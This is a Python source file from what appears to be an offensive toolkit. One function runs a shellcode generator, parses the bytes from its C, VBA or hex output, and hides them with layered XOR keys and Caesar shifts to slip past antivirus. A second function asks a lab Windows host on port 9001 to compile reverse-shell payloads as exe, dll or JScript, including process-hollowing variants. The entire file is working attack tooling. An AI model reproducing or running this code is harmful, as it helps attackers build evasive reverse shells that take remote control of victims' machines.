import subprocess
import re
import socket
from time import sleep


def encrypt_shellcode(command, format):
    XOR_KEYS = [0x74, 0x79]
    CAESAR_SHIFTS = [17, 5]

    result = subprocess.run(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True
    )
    if format == "c":
        matches = re.findall(r'"([^"]+)"', result.stdout)
        hex_string = "".join(matches)
        hex_numbers = re.findall(r"\\x([0-9a-fA-F]{2})", hex_string)
    else:
        hex_numbers = re.findall(r"0x[0-9a-fA-F]+", result.stdout)

    xor_result1 = [int(hex_value, 16) ^ XOR_KEYS[1] for hex_value in hex_numbers]  # y
    caesar_result1 = [(value + CAESAR_SHIFTS[1]) % 256 for value in xor_result1]

    xor_result2 = [hex_value ^ XOR_KEYS[0] for hex_value in caesar_result1]  # t
    caesar_result2 = [(value + CAESAR_SHIFTS[0]) % 256 for value in xor_result2]

    if format == "vba":
        encrypted_shellcode = caesar_result2
    elif format == "c":
        encrypted_shellcode = "".join(["\\x{:02x}".format(b) for b in caesar_result2])
    else:
        encrypted_shellcode = [hex(value) for value in caesar_result2]

    return encrypted_shellcode


def build_revshell(template, arch):
    win2019 = "10.0.2.20"
    buildport = 9001
    messages = {
        "exe": "exec-revshell",
        "exe-ph": "exec-revshell",
        "exe-nomigrate": "exec-revshell",
        "dll": "dll-revshell",
        "dll-ph": "dll-revshell",
        "dll-nomigrate": "dll-revshell",
        "js": "dotnet2jscript",
        "js-ph": "dotnet2jscript",
    }

    message = f"{arch}:{messages[template]}"
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((win2019, buildport))
            s.sendall(message.encode("utf-8"))
        sleep(5)
    except Exception as e:
        print(f"Compiling ran into an error: {e}")
        quit()
